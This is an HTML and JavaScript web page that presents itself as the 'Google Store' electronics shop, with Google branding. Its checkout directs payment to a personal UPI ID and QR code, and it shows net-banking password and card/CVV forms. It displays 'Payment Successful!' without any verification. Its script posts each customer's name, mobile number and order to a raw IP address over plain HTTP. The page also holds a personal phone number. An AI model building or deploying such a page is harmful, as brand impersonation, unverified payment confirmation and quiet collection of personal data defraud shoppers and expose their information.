<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>Google Store ‚Äî Electronics</title>
<link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/1200px-Google_%22G%22_logo.svg.png">
<meta name="description" content="Advanced demo e-commerce template: animations, carousel, cart, filters, offline" />
<link rel="stylesheet" href="style.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.css"/>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js" defer></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/ScrollTrigger.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/swiper@10/swiper-bundle.min.js" defer></script>
<script src="https://cdn.jsdelivr.net/npm/vanilla-tilt@1.7.3/dist/vanilla-tilt.min.js" defer></script>
<script src="https://unpkg.com/feather-icons" defer></script>
<style>
/* --- Additional Animations --- */
@keyframes fadeSpin {
  0% {opacity:0; transform:scale(0.92) rotate(-8deg);}
  70% {opacity:0.8;}
  100% {opacity:1; transform:scale(1) rotate(0);}
}
.preloader .loader {
  animation: fadeSpin 0.8s cubic-bezier(.87,0,.13,1) backwards;
}
.parallax .p-layer {
  transition: transform 1.2s cubic-bezier(.78,0,.2,1);
  will-change: transform;
}
.reveal {
  opacity: 0;
  transform: translateY(48px) scale(0.98);
  transition: opacity 0.7s cubic-bezier(.68,0,.21,1), transform 0.7s cubic-bezier(.68,0,.21,1);
}
/* Remove translucent color from parallax background layers */
.parallax .layer-1 { background: linear-gradient(120deg, #319eec 50%, #319eec 100%); }
.parallax .layer-2 { background: linear-gradient(60deg, #a7ffeb 70%, #a7ffeb 100%); }
.parallax .layer-3 { background: linear-gradient(180deg, #f5a623 0%, #f5a623 90%);}
.hero .hero-card.floating {
  box-shadow: 0 12px 42px #10a8ff33, 0 1.5px 0.8px #0002;
  transition: transform .5s cubic-bezier(.53,2,.23,.9), box-shadow .4s;
  animation: parallax-float 2.5s ease-in-out infinite alternate;
}
.nav-inner, .controls, .catalog {
  transition: box-shadow .5s cubic-bezier(.5,0,.3,1);
}
.site-header, .site-footer {
  background: linear-gradient(to right, #061921 50%, #232c39 100%);
  transition: background 1.2s;
}
.hero-left, .hero-right, .controls, .catalog {
  opacity: 0;
  transform: translateY(40px) scale(0.97);
}
footer.site-footer {
  animation: fadein-footer 1.5s 1.5s both;
}
@keyframes fadein-footer { from{opacity:0} to{opacity:1} }
/* Quick view modal background black */
#modal .modal-card {
  background: #000 !important;
}
#modal .modal-card, #paymentModal .modal-card {
  animation: pop-in 0.55s both cubic-bezier(.61,-0.06,.26,1.22);
}
@keyframes pop-in {
  0% {opacity:0; transform:scale(0.87) translateY(18px);}
  70% {opacity:1;}
  100% {transform:scale(1) translateY(0);}
}
@keyframes parallax-float {
  0%   { transform:translateY(0);}
  100% { transform:translateY(12px);}
}
</style>
</head>
<body data-category="electronics" data-theme="dark">
<div id="preloader" class="preloader" role="status" aria-live="polite">
  <div class="loader">
    <svg viewBox="0 0 100 100" class="spin"><circle cx="50" cy="50" r="40"></circle></svg>
    <div class="loader-text">Loading Google Store...</div>
  </div>
</div>

<header class="site-header" role="banner">
  <div class="nav-inner container">
      <span class="brand-text">
        <img src="https://latestlogo.com/wp-content/uploads/2024/01/google-store-logo.png" alt="Google Store Logo" style="width:132px; height:66px; object-fit:contain; vertical-align:middle; margin-left:6px;">
      </span>
    </a>
    <nav class="main-nav" aria-label="Primary">
      <ul>
        <li><a href="/electronics" class="active">Electronics</a></li>
        
      </ul>
    </nav>
    <div class="nav-actions">
      <div class="search-wrap">
        <input id="search" type="search" placeholder="Search products..." aria-label="Search products">
        <button id="clearSearch" class="icon-btn" title="Clear search" aria-hidden="true">‚úï</button>
      </div>
      <button id="viewToggle" class="icon-btn" title="Toggle view" aria-pressed="false">üîÅ</button>
      <button id="themeToggle" class="icon-btn" title="Toggle theme" aria-pressed="false">üåì</button>
      <button id="cartBtn" class="icon-btn cart-btn" aria-label="Open cart">üõí <span id="cartCount" class="cart-count">0</span></button>
    </div>
  </div>
</header>

<div class="parallax">
  <div class="p-layer layer-1"></div>
  <div class="p-layer layer-2"></div>
  <div class="p-layer layer-3"></div>
</div>

<main class="container main" role="main">
  <section class="hero">
    <div class="hero-left reveal">
      <h1 id="page-title">Electronics</h1>
      <p class="lead" id="page-sub"></p>
      <div class="hero-cta">
        <button id="browseAll" class="btn primary">Browse all</button>
        <button id="viewDeals" class="btn ghost">Top deals</button>
      </div>
      <div class="meta-row">
        <div class="muted">Free shipping | Secure checkout</div>
      </div>
    </div>
    <div class="hero-right reveal">
      <div class="hero-card floating" id="hero-feature">
        <img id="hero-image" src="https://via.placeholder.com/420x280?text=Feature" alt="Featured product" loading="lazy">
        <div class="hero-info">
          <div id="hero-name">Hot pick</div>
          <div id="hero-price">‚Çπ0</div>
        </div>
      </div>
    </div>
  </section>

  <section class="controls reveal">
    <div class="controls-left">
      <label>Sort:
        <select id="sort" onchange="applyFilters()">
          <option value="featured">Featured</option>
          <option value="price-asc">Price: Low ‚Üí High</option>
          <option value="price-desc">Price: High ‚Üí Low</option>
          <option value="rating">Top rated</option>
        </select>
      </label>
      <label>Category:
        <select id="categoryFilter" onchange="applyFilters()">
          <option value="all">All</option>
          <option value="new">New arrivals</option>
        </select>
      </label>
    </div>
    <div class="controls-right">
      <label class="switch">
        <input id="toggleLazy" type="checkbox" checked>
        <span class="slider"></span>
      </label>
      <small class="muted">Lazy images</small>
      <button id="gridBtn" class="btn small">Grid</button>
      <button id="carouselBtn" class="btn small ghost">Carousel</button>
    </div>
  </section>

  <section class="catalog reveal">
    <div id="gridView" class="grid-view" aria-live="polite" tabindex="-1"></div>
    <div id="carouselView" class="carousel-view" aria-hidden="true">
      <div class="swiper mySwiper">
        <div class="swiper-wrapper" id="swiperWrapper"></div>
        <div class="swiper-button-next"></div>
        <div class="swiper-button-prev"></div>
        <div class="swiper-pagination"></div>
      </div>
    </div>
  </section>
</main>

<div id="modal" class="modal-backdrop" aria-hidden="true" role="dialog" aria-modal="true">
  <div class="modal-card" role="document">
    <button id="modalClose" class="close" aria-label="Close">‚úï</button>
    <div class="modal-grid">
      <div class="modal-media"><img id="modalImg" src="" alt="" loading="lazy"></div>
      <div class="modal-content">
        <h2 id="modalTitle">Product</h2>
        <p id="modalDesc" class="muted">Description</p>
        <div id="modalPrice" class="price">‚Çπ0</div>
        <div class="modal-actions">
          <button id="modalAdd" class="btn primary">Add to cart</button>
          <button id="modalFav" class="btn ghost">‚ù§ Wishlist</button>
        </div>
      </div>
    </div>
  </div>
</div>

<aside id="cart" class="cart" style="background: #000;" aria-label="Shopping cart" aria-hidden="true">
  <div class="cart-header">
    <h3>Cart</h3>
    <button id="cartClose" class="close" aria-label="Close">‚úï</button>
  </div>
  <div id="cartList" class="cart-list" tabindex="0"></div>
  <div class="cart-footer">
    <div class="total-row">
      <div class="muted">Total</div>
      <div id="cartTotal" class="price">‚Çπ0</div>
    </div>
    <div class="cart-actions">
      <button id="checkout" class="btn primary">Checkout</button>
      <button id="emptyCart" class="btn ghost">Empty</button>
    </div>
  </div>
</aside>

<footer class="site-footer">
  <div class="container">
    <div class="foot-grid">
      <div><strong>Google Store</strong><p class="muted">developed by Abinash Kumar</p></div>
      <div class="muted">¬© <span id="year"></span></div>
    </div>
  </div>
</footer>

  <!-- Payment Modal -->
<div id="paymentModal" class="modal-backdrop" aria-hidden="true" role="dialog" aria-modal="true" style="display:none">
  <div class="modal-card" role="document" style="max-width: 480px;">
    <button id="paymentClose" class="close" aria-label="Close" style="top:10px;right:10px;position:absolute;">‚úï</button>
    <div style="padding: 32px 24px 24px;">
      <h2 style="margin-top:0">Payment</h2>
      <!-- Customer info for UPI, only ask the first time before "I've Paid via UPI" -->
      <div id="customerInfoSection" style="display:none; margin-bottom: 20px;">
        <form id="upiCustomerForm" autocomplete="off" onsubmit="return false;" style="margin-bottom:0;">
          <div style="display:flex; gap:10px; margin-bottom:8px;">
            <label style="flex:1;">
              <span style="display:block;font-size:0.95em;margin-bottom:2px;">Name</span>
              <input id="customerNameInput" type="text" maxlength="50" required placeholder="Enter your name" style="width:100%;padding:6px;" autocomplete="off">
            </label>
          </div>
          <div style="display:flex; gap:10px;">
            <label style="flex:1;">
              <span style="display:block;font-size:0.95em;margin-bottom:2px;">Mobile</span>
              <input id="customerMobileInput" type="tel" maxlength="14" pattern="[0-9]{10,14}" required placeholder="Enter your mobile" style="width:100%;padding:6px;" autocomplete="off">
            </label>
          </div>
        </form>
        <div id="upiUserError" style="color:#e46c6c;font-size:0.96em;margin-top:6px;display:none;text-align:left;"></div>
      </div>
      <p class="muted">Choose your payment method:</p>
      <div style="margin: 24px 0;">
        <button class="btn primary" onclick="showPaymentTab('UPI')">UPI</button>
        <button class="btn ghost" onclick="showPaymentTab('Netbanking')">Net Banking</button>
        <button class="btn ghost" onclick="showPaymentTab('Card')">Credit/Debit Card</button>
      </div>
      <!-- Show Total Amount in Payment Modal -->
      <div id="totalAmountWrapper" style="margin-bottom: 24px; text-align:center;">
        <span style="font-size:1.1em;color:#fff;">Total Amount to Pay:&nbsp;</span>
        <span id="totalPaymentAmount" style="font-weight:bold;font-size:1.25em;color:#4dd784;">‚Çπ0</span>
      </div>
      <div id="paymentUPI" style="display:none;">
        <div style="margin-bottom:1em;">Pay to UPI ID: <strong>6303965190@kotak811</strong></div>
        <img src="https://i.ibb.co/84GXkSMt/pay.jpg" alt="UPI QR" style="display:block;margin:0 auto 1em auto;width:150px;height:150px;object-fit:contain;background:#fff;border-radius:8px;">
        <input id="upiInput" type="text" value="6303965190@kotak811" readonly style="width:100%;padding:6px;margin-bottom:1em;text-align:center;" onclick="this.select()">
        <div style="font-size:0.95em;color:#aaa; text-align:center;">Scan QR with any UPI app or copy/paste UPI ID</div>
        <button class="btn small" style="margin-top:1em" onclick="copyUPIID()">Copy UPI ID</button>
      </div>
      <div id="paymentNetbanking" style="display:none;">
        <form id="netbankingForm" onsubmit="event.preventDefault(); handlePaymentDone('Netbanking');">
          <label style="display:block; margin-bottom:8px;">Bank
            <select required style="width:100%;padding:6px;">
              <option value="">Choose bank</option>
              <option>SBI</option>
              <option>HDFC Bank</option>
              <option>Kotak Mahindra</option>
              <option>ICICI Bank</option>
              <option>Axis Bank</option>
              <option>Other...</option>
            </select>
          </label>
          <label style="display:block; margin-bottom:8px;">User ID
            <input type="text" required style="width:100%;padding:6px;" />
          </label>
          <label style="display:block; margin-bottom:16px;">Password
            <input type="password" required style="width:100%;padding:6px;" autocomplete="off"/>
          </label>
          <button class="btn primary" type="submit" style="width:100%;">Pay Now</button>
        </form>
      </div>
      <div id="paymentCard" style="display:none;">
        <form id="cardPaymentForm" onsubmit="event.preventDefault(); handlePaymentDone('Card');">
          <label style="display:block; margin-bottom:8px;">Card Number
            <input type="text" maxlength="19" pattern="\d*" inputmode="numeric" placeholder="XXXX XXXX XXXX XXXX" required style="width:100%;padding:6px;" />
          </label>
          <div style="display:flex;gap:8px;margin-bottom:8px;">
            <label style="flex:1;">Expiry
              <input type="text" maxlength="5" pattern="\d{2}/\d{2}" placeholder="MM/YY" required style="width:100%;padding:6px;" />
            </label>
            <label style="flex:1;">CVV
              <input type="password" maxlength="4" pattern="\d{3,4}" placeholder="CVV" required style="width:100%;padding:6px;" />
            </label>
          </div>
          <label style="display:block; margin-bottom:16px;">Name on card
            <input type="text" required style="width:100%;padding:6px;" />
          </label>
          <button class="btn primary" type="submit" style="width:100%;">Pay Now</button>
        </form>
      </div>
      <!-- Receipt Modal (hidden initially) -->
      <div id="receiptModal" style="display:none; background: #1e1e1e; border-radius: 8px; box-shadow:0 0 8px #0007; padding:28px 24px 24px 24px; text-align:center; margin-top:16px;">
        <h3 style="color:#4dd784; margin-bottom:0.5em;">Payment Successful!</h3>
        <div class="muted" style="margin-bottom:1em;">Thank you for your purchase.<br>Your payment has been received. <br>You can now view or download your receipt.</div>
        <button class="btn primary" onclick="viewReceipt()">View Receipt</button>
        <button class="btn ghost" style="margin-left:12px" onclick="downloadReceipt()">Download Receipt</button>
      </div>
      <!-- End receipt modal section -->
    </div>
  </div>
</div>
<style>
#paymentModal[aria-hidden="false"] { display: flex !important; align-items: center; justify-content: center; }
#paymentModal .modal-card { background: #161616; border-radius: 10px; box-shadow: 0 4px 32px #0008; }
</style>

<script src="script.js" defer></script>
<script>

// --- Receipt Data Extraction ---
function extractCartProducts() {
  const cartListElem = document.getElementById('cartList');
  if (!cartListElem || cartListElem.children.length === 0) return [];
  let products = [];
  for (const child of Array.from(cartListElem.children)) {
    let name = '', price = '', qty = 1, desc = '', img = '';

    if (child.querySelector) {
      let el;
      if ((el = child.querySelector('.cart-name'))) name = el.textContent.trim();
      if ((el = child.querySelector('.cart-price'))) price = el.textContent.trim();
      if ((el = child.querySelector('.cart-qty'))) qty = Number(el.textContent.trim()) || 1;
      if ((el = child.querySelector('.cart-desc'))) desc = el.textContent.trim();
      if ((el = child.querySelector('.cart-img')) && el.tagName.toLowerCase() === 'img') {
        img = el.src;
      } else if ((el = child.querySelector('img'))) {
        img = el.src;
      }
      if (!name || !price) {
        let text = child.textContent || '';
        let priceMatch = text.match(/‚Çπ\s*([0-9,.]+)/);
        if (priceMatch) price = '‚Çπ' + priceMatch[1];
        let qtyMatch = text.match(/x\s*(\d+)/);
        if (qtyMatch) qty = parseInt(qtyMatch[1]);
        if (priceMatch) {
          const beforePrice = text.slice(0, priceMatch.index).trim();
          name = beforePrice.replace(/x\s*\d+$/, '').trim();
        } else {
          name = text.split('‚Çπ')[0].replace(/x\s*\d+$/, '').trim();
        }
      }
    } else {
      let text = child.textContent || '';
      let priceMatch = text.match(/‚Çπ\s*([0-9,.]+)/);
      if (priceMatch) price = '‚Çπ' + priceMatch[1];
      let qtyMatch = text.match(/x\s*(\d+)/);
      if (qtyMatch) qty = parseInt(qtyMatch[1]);
      name = text.split('‚Çπ')[0].replace(/x\s*\d+$/, '').trim();
    }

    products.push({
      name,
      price,
      qty,
      desc,
      img
    });
  }
  return products;
}

// --- Customer info read helpers
let userEnteredCustomerName = null;
let userEnteredCustomerMobile = null;
let alreadyAskedCustomerInfo = false; // Only ask once per session/pay

function getCustomerName() {
  let activeTab = window._currentPaymentTab || 'UPI';
  if (activeTab === 'UPI') {
    if (typeof userEnteredCustomerName === 'string' && userEnteredCustomerName.trim() !== '') {
      return userEnteredCustomerName;
    }
    var nameInput = document.getElementById('customerNameInput');
    if (nameInput && nameInput.value.trim() !== '') {
      return nameInput.value.trim();
    }
  }
  return "abinash";
}
function getCustomerMobile() {
  let activeTab = window._currentPaymentTab || 'UPI';
  if (activeTab === 'UPI') {
    if (typeof userEnteredCustomerMobile === 'string' && userEnteredCustomerMobile.trim() !== '') {
      return userEnteredCustomerMobile;
    }
    var mobileInput = document.getElementById('customerMobileInput');
    if (mobileInput && mobileInput.value.trim() !== '') {
      return mobileInput.value.trim();
    }
  }
  return "6202965190";
}
function isValidMobile(mobile) {
  return /^[0-9]{10,14}$/.test(mobile);
}
function isCustomerFormValid() {
  let tab = window._currentPaymentTab || 'UPI';
  if (tab === 'UPI') {
    var nameInput = document.getElementById('customerNameInput');
    var mobileInput = document.getElementById('customerMobileInput');
    if (!nameInput || !mobileInput) return false;
    let nameValid = !!nameInput.value.trim();
    let mobileValid = isValidMobile(mobileInput.value.trim());
    return nameValid && mobileValid;
  }
  return true;
}

// Payment Modal Logic
const paymentModal = document.getElementById('paymentModal');
const paymentTabs = {
  UPI: document.getElementById('paymentUPI'),
  Netbanking: document.getElementById('paymentNetbanking'),
  Card: document.getElementById('paymentCard')
};
const customerInfoSection = document.getElementById('customerInfoSection');
const upiUserError = document.getElementById('upiUserError');

// Show/hide customer info: only show if UPI tab and before successful submit
function showPaymentTab(tab) {
  Object.values(paymentTabs).forEach(t => t.style.display = 'none');
  paymentTabs[tab].style.display = '';
  if (tab === 'UPI') {
    customerInfoSection.style.display = alreadyAskedCustomerInfo ? "none" : "block";
  } else {
    customerInfoSection.style.display = "none";
  }
  hideReceipt();
  window._currentPaymentTab = tab;
}

function openPaymentModal() {
  paymentModal.style.display = 'flex';
  paymentModal.setAttribute('aria-hidden', 'false');
  showPaymentTab('UPI');
  updateTotalPaymentAmount();
  hideReceipt();
  setTimeout(function(){
    if(window._currentPaymentTab === "UPI" && !alreadyAskedCustomerInfo) {
      const inp = document.getElementById('customerNameInput');
      if (inp) inp.focus();
    }
  }, 100);
}
function closePaymentModal() {
  paymentModal.style.display = 'none';
  paymentModal.setAttribute('aria-hidden', 'true');
  hideReceipt();
}
document.getElementById('paymentClose').onclick = closePaymentModal;

function hideReceipt() {
  const receiptDiv = document.getElementById("receiptModal");
  if (receiptDiv) receiptDiv.style.display = 'none';
}
function generateUPIQR() {}
function copyUPIID() {
  const input = document.getElementById("upiInput");
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  alert("UPI ID Copied: " + input.value);
}

// --- Upload helper (talks to Flask/S3) ---
// Send receipt copy for admin (abinash) record purposes
async function uploadReceiptToS3(receiptText, mobile) {
  try {
    const now = Date.now();
    const receiptFileName = `GoogleStoreReceipt_${mobile}_${now}.txt`;
    const res = await fetch("http://18.181.35.96/upload_receipt", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        receipt_text: receiptText,
        mobile: mobile,
        receipt_filename: receiptFileName
      })
    });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || "Upload failed");
    // Only show this info: receipt copy saved to admin abinash
    alert("A copy of your receipt has been saved by admin (abinash).");
    return data.s3_url;
  } catch (err) {
    alert("Error uploading receipt: " + err.message);
    console.error("‚ùå Error uploading receipt:", err);
  }
}

// --- Enhanced: receipt with product, purchased details, customer info and product small image
async function viewReceipt() {
  const customerName = getCustomerName();
  const customerMobile = getCustomerMobile();
  const date = new Date();
  const total = document.getElementById('totalPaymentAmount').textContent;
  const products = extractCartProducts();
  let itemsText = '';
  let itemsHTML = '';

  if (products.length > 0) {
    itemsText += 'Products Purchased:\n';
    itemsHTML = `<table style="width:100%;border-collapse:collapse;font-size:1em;">
      <thead>
        <tr>
          <th style="border-bottom:1px solid #eee;text-align:left;padding:4px 0;">Product</th>
          <th style="border-bottom:1px solid #eee;text-align:center;padding:4px 0;">Qty</th>
          <th style="border-bottom:1px solid #eee;text-align:right;padding:4px 0;">Price</th>
        </tr>
      </thead><tbody>`;
    products.forEach(p => {
      itemsText += `- ${p.name || 'Product'} | Qty: ${p.qty || 1} | Price: ${p.price || ''}\n`;
      itemsHTML += `
        <tr>
          <td style="padding:3px 0;">${p.name}</td>
          <td style="text-align:center;">${p.qty}</td>
          <td style="text-align:right;">${p.price}</td>
        </tr>`;
    });
    itemsHTML += `</tbody></table>`;
  } else {
    itemsText = '- Purchased Phones\n';
    itemsHTML = 'Purchased Phones';
  }

  const lines = [
    'Google Store Receipt',
    '----------------------------',
    `Date: ${date.toLocaleString()}`,
  ];
  lines.push(`Name: ${customerName}`);
  lines.push(`Mobile: ${customerMobile}`);
  lines.push(itemsText.trim());
  lines.push('----------------------------');
  lines.push(`Total Paid: ${total}`);
  lines.push('Payment Successful!');
  lines.push('----------------------------');
  lines.push('Developed by abinash kumar');

  const receiptText = lines.join('\n');

  let htmlCustomer = '';
  htmlCustomer += `<div style="font-size:1.05em;margin-bottom:4px;"><b>Name:</b> ${customerName}</div>`;
  htmlCustomer += `<div style="font-size:1.05em;margin-bottom:10px;"><b>Mobile:</b> ${customerMobile}</div>`;

  const receiptHtml = `
    <div style="font-family:sans-serif;max-width:430px;margin:0 auto;border:1px solid #eee;border-radius:8px;padding:24px;box-shadow:0 2px 8px #0002;">
      <h2 style="text-align:center;color:#4dd784;margin-top:0;">Google Store - Receipt</h2>
      <div style="font-size:1.05em;margin:10px 0;"><b>Date:</b> ${date.toLocaleString()}</div>
      ${htmlCustomer}
      <div style="margin:15px 0 14px 0;"><b>Purchased Items:</b></div>
      <div style="margin-bottom:12px">${itemsHTML}</div>
      <div style="font-size:1.2em;margin-bottom:20px;"><b>Total Paid:</b> <span style="color:#4dd784;">${total}</span></div>
      <div style="margin-bottom:18px;color:#5c5c5c;">Payment Successful via Card/NetBanking/UPI</div>
      <div style="font-size:0.9em;color:#333;text-align:center;">Developed by abinash kumar</div>
    </div>
  `;
  const win = window.open("", "_blank", "width=480,height=600");
  if (win) {
    win.document.write("<title>Google Store Receipt</title>");
    win.document.write(receiptHtml);
    win.document.close();
  }
}

// Download receipt as text file (with products and customer info)
function downloadReceipt() {
  const customerName = getCustomerName();
  const customerMobile = getCustomerMobile();
  const date = new Date();
  const total = document.getElementById('totalPaymentAmount').textContent;
  let products = extractCartProducts();
  let itemsText = '';
  
  if (products.length > 0) {
    itemsText += 'Products Purchased:' + "\n";
    products.forEach(p => {
      itemsText += `- ${p.name || 'Product'}${p.desc ? ` (${p.desc})`:''} | Qty: ${p.qty || 1} | Price: ${p.price || ''}\n`;
    });
  } else {
    itemsText = '- Purchased Phones\n';
  }

  const lines = [
    'Google Store Receipt',
    '----------------------------',
    `Date: ${date.toLocaleString()}`,
    `Name: ${customerName}`,
    `Mobile: ${customerMobile}`,
    itemsText.trim(),
    '----------------------------',
    `Total Paid: ${total}`,
    'Payment Successful!',
    '----------------------------',
    'Developed by abinash kumar'
  ];
  const receiptTxt = lines.join('\n');
  const blob = new Blob([receiptTxt],{type:'text/plain'});
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = `GoogleStore_Receipt_${customerMobile}_${Date.now()}.txt`;
  link.click();
}

// Update the total amount in Payment Modal from cart
function updateTotalPaymentAmount() {
  let total = 0;
  const cartTotalElem = document.getElementById('cartTotal');
  if (cartTotalElem) {
    const value = cartTotalElem.textContent || '';
    const n = value.replace(/[^0-9.]/g,'');
    if (n) total = parseFloat(n);
  }
  const paymentAmountElem = document.getElementById('totalPaymentAmount');
  if(paymentAmountElem) {
    paymentAmountElem.textContent = '‚Çπ' + (isNaN(total) ? '0' : total);
  }
}

function clearCartAfterPayment() {
  const cartList = document.getElementById("cartList");
  if(cartList) cartList.innerHTML = "";
  const cartTotal = document.getElementById("cartTotal");
  if(cartTotal) cartTotal.textContent = '‚Çπ0';
  const cartCount = document.getElementById("cartCount");
  if(cartCount) cartCount.textContent = '0';
}

// Require customer info for UPI before payment
async function handlePaymentDone(method) {
  const isUPITab = (window._currentPaymentTab||'UPI') === "UPI";

  // Only ask info first time for UPI, never ask again
  if (isUPITab && !alreadyAskedCustomerInfo) {
    var nameInput = document.getElementById('customerNameInput');
    var mobileInput = document.getElementById('customerMobileInput');
    var errorDiv = document.getElementById('upiUserError');
    if (!nameInput || !mobileInput) return;
    let name = nameInput.value.trim();
    let mobile = mobileInput.value.trim();
    let hasError = false, errorMsg = "";
    if (!name) {
      hasError = true;
      errorMsg = "Please enter your name.";
    } else if (!isValidMobile(mobile)) {
      hasError = true;
      errorMsg = "Please enter a valid 10-14 digit mobile number.";
    }
    if (hasError) {
      if (errorDiv) { errorDiv.textContent = errorMsg; errorDiv.style.display = "block"; }
      if (!name) nameInput.focus();
      else mobileInput.focus();
      return;
    } else if (errorDiv) {
      errorDiv.style.display = "none";
      errorDiv.textContent = "";
    }
    userEnteredCustomerName = name;
    userEnteredCustomerMobile = mobile;
    alreadyAskedCustomerInfo = true;
    customerInfoSection.style.display = "none";
  }
  Object.values(paymentTabs).forEach(t => t.style.display = 'none');
  var receiptDiv = document.getElementById("receiptModal");
  if(receiptDiv){
    receiptDiv.style.display = 'block';
  }
  await autoSendReceiptToS3();
  // clearCartAfterPayment(); // optional
}

// Helper generates receipt and uploads to S3 per mobile-number _every_ time payment is done, always new file
async function autoSendReceiptToS3() {
  const customerName = getCustomerName();
  const customerMobile = getCustomerMobile();
  const date = new Date();
  const total = document.getElementById('totalPaymentAmount').textContent;
  const products = extractCartProducts();
  let itemsText = '';

  if (products.length > 0) {
    itemsText += 'Products Purchased:\n';
    products.forEach(p => {
      itemsText += `- ${p.name || 'Product'} | Qty: ${p.qty || 1} | Price: ${p.price || ''}\n`;
    });
  } else {
    itemsText = '- Purchased Phones\n';
  }

  const lines = [
    'Google Store Receipt',
    '----------------------------',
    `Date: ${date.toLocaleString()}`,
    `Name: ${customerName}`,
    `Mobile: ${customerMobile}`,
    itemsText.trim(),
    '----------------------------',
    `Total Paid: ${total}`,
    'Payment Successful!',
    '----------------------------',
    'Developed by abinash kumar'
  ];
  const receiptText = lines.join('\n');

  // ALWAYS save as new S3 file named for this mobile and this unique timestamp
  await uploadReceiptToS3(receiptText, customerMobile);
}

// Attach event to checkout button
document.addEventListener('DOMContentLoaded', function() {
  const checkoutBtn = document.getElementById('checkout');
  if(checkoutBtn){
    checkoutBtn.addEventListener('click', function(ev){
      ev.preventDefault();
      openPaymentModal();
    });
  }
  const cartTotalElem = document.getElementById('cartTotal');
  if(cartTotalElem) {
    const observer = new MutationObserver(updateTotalPaymentAmount);
    observer.observe(cartTotalElem, {childList:true, characterData:true, subtree:true});
  }
  // UPI paid button create
  const upiBtn = document.createElement('button');
  upiBtn.type = "button";
  upiBtn.textContent = "I've Paid via UPI";
  upiBtn.className = "btn primary";
  upiBtn.style = "margin-top:1.5em; width:100%";
  upiBtn.onclick = function(){ handlePaymentDone('UPI'); }
  const upiDiv = document.getElementById('paymentUPI');
  if(upiDiv && !document.getElementById("upiPaidBtn")){
    upiBtn.id = "upiPaidBtn";
    upiDiv.appendChild(upiBtn);
  }

  // Auto select tab and show customer info if tab is UPI on load, but never again after submitted
  showPaymentTab('UPI');
});

// When switching payment tabs manually, clear error and user-entered value only if not submitted yet
function resetCustomerInfoIfNeeded() {
  if (alreadyAskedCustomerInfo) {
    customerInfoSection.style.display = "none";
    return;
  }
  userEnteredCustomerName = null;
  userEnteredCustomerMobile = null;
  const nameInput = document.getElementById('customerNameInput');
  const mobileInput = document.getElementById('customerMobileInput');
  const errorDiv = document.getElementById('upiUserError');
  if (nameInput) nameInput.value = '';
  if (mobileInput) mobileInput.value = '';
  if (errorDiv) { errorDiv.textContent = ""; errorDiv.style.display = "none"; }
  if (window._currentPaymentTab === "UPI") {
    customerInfoSection.style.display = "block";
  }
}
document.querySelectorAll('button[onclick^="showPaymentTab"]').forEach(btn=>{
  btn.addEventListener('click',resetCustomerInfoIfNeeded);
});

paymentModal.addEventListener('mousedown', function(e) {
  if (e.target == paymentModal)
    closePaymentModal();
});

</script>  

<script src="script.js" defer></script>
</body>
</html>

